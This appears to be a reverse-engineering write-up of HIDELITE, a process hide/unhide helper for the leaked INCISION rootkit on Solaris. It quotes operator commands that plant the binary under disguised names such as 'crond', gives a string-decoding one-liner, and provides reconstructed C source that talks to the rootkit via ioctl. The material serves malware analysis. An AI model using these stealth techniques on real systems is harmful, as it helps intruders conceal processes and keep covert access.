### [Home](https://CybernetiX-S3C.github.io)   [Main](https://CybernetiX-S3C.github.io/main)

[STOIC SURGEON](https://CybernetiX-S3C.github.io/main/stoicsurgeon)
[RESEARCH](https://CybernetiX-S3C.github.io/main/stoicsurgeon/research)
[CONTRIBUTING](https://CybernetiX-S3C.github.io/main/stoicsurgeon/contrib)
[ABOUT](https://CybernetiX-S3C.github.io/main/stoicsurgeon/about)

# DITTELIGHT / DITTLELITE / HIDELITE

This tool can be used to unhide processes that were hidden using the INCISION rootkit. A noteable use of this tool is to unhide processes such that Oracle databases can be queried from the (previously hidden) process. The tool can also hide the process again.

In [the Oracle opscript](https://github.com/CybernetiX-S3C/EQGRP_Linux/blob/master/Linux/etc/oracle/opscript):
```
#########################################################################
# This is required for unhiding our processes on an INCISION box.	#
# Oracle requires that it see our processes when we query the database. #
#########################################################################
-put /current/up/hidelite.solaris.sparc $TMPDIR/nscd
```

The [HIDELITE user tool](https://github.com/CybernetiX-S3C/EQGRP_Linux/blob/master/Linux/doc/old/doc/user.tool.dittlelight_hidelite.COMMON) provides some usage examples:
```
-put /current/bin/hidelite.sparc crond

### run hidelite to unhide the callback window:
./crond -u -p NOPEN_CALLBACK_WINDOW_PID 

...

### To hide again
./crond -h -p NOPENPID
```

Hidelite needs to run in a window that is a direct child of PID 1. ([Source](https://github.com/CybernetiX-S3C/EQGRP_Linux/blob/master/Linux/doc/old/etc/user.mission.sicklestar.COMMON#L1181-L1182))


## Reverse Engineering HIDELITE

Since my SPARC assembly was non-existent before starting this reverse engineering quest, it was a fun and small binary to reverse. There might be some mistakes in the analysis and C code though. (Always check the disassembly yourself)

Interesting to note is that it uses the same kind of string obfuscation as [the PORK traffic](../implants/pork.md) over the wire does, only the value being multiplied with, is different (`0x1d`).

You can quickly dump the hidden strings used by HIDELITE using this one-liner:
```
$ cat hidelite.solaris | perl -nle 'print join "", map{ chr((ord()*29) & 0xff) } split //' | strings
S<T6
6YA<
`W @ZW 
jk (0k 
0 \#
jk (0k 
@n`t
8jk (0k 
/bin/sh
p:hu
%s invalid address
post: %s
ioctl error
exec failed: %s
post: %s
return code = %d
usage error
PS1=hidden: 
/proc/%05d
YYqv$
```

According to [the SICKLESTAR notes](https://github.com/CybernetiX-S3C/EQGRP_Linux/blob/master/Linux/doc/old/etc/user.mission.sicklestar.COMMON#L1180) the HIDELITE binary should contain INCISION keys. I was unable to find anything that looks like it (3 random looking 32-bit integers) but it could be the 64 bytes that I called "dunno" in my C code (that's the only place it would fit).

(Warning: People have reported sudden loss of eyesight when looking at the code. Proceed with caution.)
```c
#include<stdio.h>
#include<stdlib.h>
#include<stdint.h>

#include<sys/ioctl.h>
#include<string.h>
#include<unistd.h>
#include<fcntl.h>

/* In the original code it's not array but just loose strings */
uint8_t encrypted_strings[][50] = {
	"\xbb\x4a\xbd\xc6\xbb\xcf\x88", /* /bin/sh */
	"\x30\x02\x88\x39", /* p:hu */
	"\xa9\xcf\xa0\xbd\xc6\x6e\x15\x5c\xbd\xb4\xa0\x15\xb4\xb4\x9a\xe9\xcf\xcf\x12", /* %s invalid address\n */
	"\x30\xfb\xcf\x04\x02\xa0\xa9\xcf\x12", /* post: %s\n */
	"\xbd\xfb\x7f\x04\x5c\xa0\xe9\x9a\x9a\xfb\x9a\x12", /* ioctl error\n */
	"\xe9\xd8\xe9\x7f\xa0\x1e\x15\xbd\x5c\xe9\xb4\x02\xa0\xa9\xcf\x12", /* exec failed: %s\n */
	"\x30\xfb\xcf\x04\x02\xa0\xa9\xcf\x12", /* post: %s\n */
	"\x9a\xe9\x04\x39\x9a\xc6\xa0\x7f\xfb\xb4\xe9\xa0\xa1\xa0\xa9\xb4\x12", /* return code = %d\n */
	"\x39\xcf\x15\x53\xe9\xa0\xe9\x9a\x9a\xfb\x9a\x12", /* usage error\n */
	"\x90\x2f\x25\xa1\x88\xbd\xb4\xb4\xe9\xc6\x02\xa0", /* PS1=hidden: */
	"\xbb\x30\x9a\xfb\x7f\xbb\xa9\xf0\xf9\xb4" /* /proc/%05d */
};

void decrypt_str(uint8_t* str, uint32_t key);
uint32_t post(uint32_t pid, uint32_t bitmask, uint32_t fp_4ch);

int main(int argc, char** argv) {
	uint32_t bitmask, fp_m18h, unhide;
	uint32_t pid = bitmask = fp_m18h = unhide = 0;

	if(argc < 2) {
		decrypt_str(encrypted_strings[8], 0x1d);
		fprintf(stderr, encrypted_strings[8]);
		exit(1);
	}

	decrypt_str(encrypted_strings[1], 0x1d);
	int32_t c;
	while((c = getopt(argc, argv, encrypted_strings[1])) != -1) {
		switch(c) {
			case 'h':
				bitmask = bitmask | 0x40;
				break;
			case 'u':
				bitmask = bitmask | 0x80;
				unhide = 1;
				break;
			case 'p':
				pid = atoi(optarg);
				break;
			case 'r':
				bitmask = bitmask | 8;
				break;
		}
	}

	// 0x10c10
	bitmask = (bitmask & -3) | 4;
	uint32_t post_return_value = post(pid, bitmask, fp_m18h);
	if(post_return_value != 0) {
		if(post_return_value <= 0) { // 0x10c9c
			decrypt_str(encrypted_strings[4], 0x1d);
			fprintf(stderr, encrypted_strings[4]);
		} else { // 0x10c5c
			decrypt_str(encrypted_strings[3], 0x1d);
			fprintf(stdout, encrypted_strings[3], strerror(post_return_value));
		}
		exit(post_return_value);
	}
}

uint32_t post(uint32_t pid, uint32_t bitmask, uint32_t fp_4ch) {
	struct something {
		uint32_t i; // fp_m8ch; 
		uint32_t bitmask; // fp_m88h
		uint32_t pid; // fp_m84h
		uint32_t unknown; // fp_m80h
		uint32_t thirdarg; // fp_m7ch
		char buf[0x18]; // see bzero call
		char buf2[0x40]; // see bcopy
		uint32_t two; // fp_m20c
		uint32_t minus1; // fp_m1ch
		uint32_t* bitmaskagain; // fp_m18h
		uint32_t unknown2; 
		uint32_t fourty; // fp_m10h
		uint32_t fp_mch;
		
	};

	struct something huh;
	huh.i = 0;
	bzero(&huh.buf2, 0x54);
	const char dunno[0x40] = "\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xfe\xf8\xa0\xff\xfe\xfe\x70\xff\xfe\xfd\xd0\xff\xfe\xfe\x70\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
	bcopy(dunno, &huh.buf2, 0x40); 
		// :> px 0x40 @ 0x21120
		// - offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
		// 0x00021120  0100 0000 0100 0000 0000 0000 0000 0000  ................
		// 0x00021130  0000 0000 0000 0000 0000 0000 0000 0000  ................
		// 0x00021140  fffe f8a0 fffe fe70 fffe fdd0 fffe fe70  .......p.......p
		// 0x00021150  0000 0000 0000 0000 0000 0000 0000 0000  ................

	huh.two = 2;
	bzero(&huh.bitmask, 0x28);
	huh.minus1 = -1;
	huh.fourty = 0x28;
	huh.bitmaskagain = &huh.bitmask; // Maybe a ptr, maybe the val, my SPARC is weak
	huh.bitmask = huh.bitmask | bitmask;
	huh.pid = pid;
	huh.thirdarg = fp_4ch;
	
	/* It doesn't seem like this is being saved? */
	huh.bitmask & 8;
	huh.bitmask & 0x40;
	huh.bitmask & 0x80;
	huh.bitmask & 0x20;
	huh.bitmask & 0x10;

	char procself[64];
	decrypt_str(encrypted_strings[10], 0x1d);
	sprintf(procself, encrypted_strings[10], getpid());
	int fd = open(procself, 0); /* fd = fp_m8h */
	if(fd == -1) {
		decrypt_str(encrypted_strings[6], 0x1d);
		fprintf(stdout, encrypted_strings[6], strerror(0x454)); // "post: %s" == 0x20c
		return -1;
	}

	return ioctl(fd, 0x1c | 0x1de, (void*) &huh); // second arg: 478
}

void decrypt_str(uint8_t* str, uint32_t key) {
	while(*str != 0) {
		*str = (*str * key) & 0xff;
		str++;
	}
}

```
